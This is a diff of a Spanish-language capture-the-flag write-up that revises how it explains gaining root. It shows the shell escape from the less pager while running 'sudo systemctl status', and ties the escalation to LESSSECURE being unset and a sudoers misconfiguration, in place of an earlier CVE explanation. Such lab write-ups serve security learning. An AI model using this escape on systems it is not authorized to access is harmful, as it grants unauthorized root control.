@@ -225,10 +225,7 @@ systemctl --version
 systemd 245 (245.4-4ubuntu3.22)
 +PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid
 ```
-
-Una búsqueda en internet nos dice que la versión es vulnerable al **CVE-2023–26604**, el cual nos permite escalar privilegios ya que esta versión y las anteriores no comprueban el eUID ni el UID.
-
-Podemos explotarlo simplemente ejecutando el comando, que como se ejcuta con **less**, podemos escapar el proceso y ejecutar otro mientras tanto usando una exclamación "**/bin/bash**", lo que nos daría una shell como usuario **root**.
+Podemos intentar ejecutar comandos dentro de systemctl, ya que usa de forma predeterminada el paginador **less** y podríamos ejecutar comandos con el eUID (en este caso 0, ya que lo ejecutamos como sudo) poniendo la exclamación **!** dentro de **less**.
 
 ```bash
 $ sudo systemctl status trail.service
@@ -243,6 +240,8 @@ root@sau:/opt/maltrail# whoami
 whoami
 root
 ```
+
+Esta explotación se debe a que **systemd** no tiene configurada la variable **LESSSECURE** en 1, lo que haría que no pudiésemos ejecutar comandos dentro de less, por lo que combinamos la falta de configuración con una configuración errónea en el archivo **/etc/sudoers**.
 
 Keep hacking!
 
